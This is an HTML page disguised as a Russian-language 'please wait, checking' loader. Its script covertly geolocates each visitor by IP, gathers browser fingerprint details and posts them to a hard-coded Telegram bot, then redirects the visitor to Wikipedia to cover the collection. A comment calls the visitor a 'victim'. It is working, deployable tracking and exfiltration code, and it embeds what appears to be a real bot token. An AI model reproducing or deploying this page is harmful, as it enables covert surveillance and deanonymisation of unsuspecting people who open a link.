<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body { background: #0e0e0e; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #aaa; }
    </style>
</head>
<body>
<div style="text-align:center;">
    <div class="loader"></div>
    <p>Пожалуйста, подождите, идёт проверка...</p>
</div>

<script>
    // Сбор данных без действий жертвы
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(geo => {
            const report = {
                ip: geo.ip || '—',
                city: geo.city || '—',
                region: geo.region || '—',
                country: geo.country_name || '—',
                lat: geo.latitude || '—',
                lon: geo.longitude || '—',
                isp: geo.org || '—',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'прямой',
                timestamp: new Date().toISOString()
            };

            const botToken = '8640024610:AAH6n87qbPdQunACY4pdr2dUDh9GzX-Q6ZY';   // замени
            const chatId = '7253706229';    // замени

            const message = `🔴 НОВЫЙ СБОР (АВТО):\n` +
                `IP: ${report.ip}\n` +
                `Город: ${report.city}\n` +
                `Регион: ${report.region}\n` +
                `Страна: ${report.country}\n` +
                `Координаты: ${report.lat}, ${report.lon}\n` +
                `Провайдер: ${report.isp}\n` +
                `Браузер: ${report.userAgent}\n` +
                `Платформа: ${report.platform}\n` +
                `Язык: ${report.language}\n` +
                `Экран: ${report.screen}\n` +
                `Часовой пояс: ${report.timezone}\n` +
                `Реферер: ${report.referrer}\n` +
                `Время: ${report.timestamp}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            })
            .then(() => {
                // Редирект на безобидный сайт (например, главную Википедии или реальный учебник)
                window.location.href = 'https://ru.wikipedia.org/wiki/Заглавная_страница';
            })
            .catch(() => {
                // Если ошибка — всё равно редирект
                window.location.href = 'https://ru.wikipedia.org';
            });
        })
        .catch(() => {
            // Если не удалось определить гео — всё равно собираем остальное и редиректим
            window.location.href = 'https://ru.wikipedia.org';
        });
</script>
</body>
</html>
